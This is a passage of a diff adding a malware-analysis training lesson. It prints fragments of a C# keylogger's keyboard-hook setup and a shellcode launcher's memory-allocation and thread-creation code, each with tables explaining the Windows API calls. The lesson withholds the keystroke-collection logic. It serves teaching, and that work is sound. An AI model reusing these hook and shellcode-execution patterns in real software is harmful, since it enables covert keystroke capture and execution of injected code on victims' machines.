+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">UnhookWindowsHookEx<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Removes an installed hook from the hook chain<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetModuleHandle<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Returns a module handle for the specified module if mapped into the calling process's address space<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">GetCurrentProcess<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Retrieves a pseudo handle for the current process.<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>To maintain the ethical integrity of this case study, we will not cover how the sample collects each keystroke. We will analyze how the sample sets a hook on the current process. Below is a snippet of the hooking section of the malware sample source code.</p>
+<pre><code class="language-plaintext">public static void Main() {
+	_hookID = SetHook(_proc);
+	Application.Run();
+	UnhookWindowsHookEx(_hookID);
+	Application.Exit();
+}
+private static IntPtr SetHook(LowLevelKeyboardProc proc) {
+	using (Process curProcess = Process.GetCurrentProcess()) {
+		return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
+	}
+}</code></pre>
+<p>Let’s understand the objective and procedure of the keylogger, then assign their respective API call from the above snippet.</p>
+<p>Using the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API documentation</a>&nbsp;and the context of the above snippet, begin analyzing the keylogger, using questions 1 - 4 as a guide to&nbsp; work through the sample.&nbsp;</p>
+<h3>Shellcode Launcher</h3>
+<p>To begin analyzing the shellcode launcher, we once again need to collect which API calls it is implementing. This process should look identical to the previous case study. Below is a snippet of the p/invoke definitions of the malware sample source code.</p>
+<pre><code class="language-plaintext">private static UInt32 MEM_COMMIT = 0x1000;
+private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+[DllImport("kernel32")]
+private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+[DllImport("kernel32")]
+private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+[DllImport("kernel32")]
+private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);</code></pre>
+<p>Below is an explanation of each API call and its respective use.</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>API Call</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Explanation</strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">VirtualAlloc</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">WaitForSingleObject</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Waits until the specified object is in the signaled state or the time-out interval elapses<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">CreateThread</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Creates a thread to execute within the virtual address space of the calling process<br>&nbsp;</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>We will now analyze how the shellcode is written to and executed from memory.</p>
+<pre><code class="language-plaintext">UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
+IntPtr hThread = IntPtr.Zero;
+UInt32 threadId = 0;
+IntPtr pinfo = IntPtr.Zero;
+hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+WaitForSingleObject(hThread, 0xFFFFFFFF);
+return;
+</code></pre>
+<p>Let’s understand the objective and procedure of shellcode execution, then assign their respective API call from the above snippet.</p>
+<p>Using the <a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">Windows API documentation</a> and the context of the above snippet, begin analyzing the shellcode launcher, using questions 5 - 8 as a guide to&nbsp; work through the sample.&nbsp;</p>
+<p>&nbsp;</p>
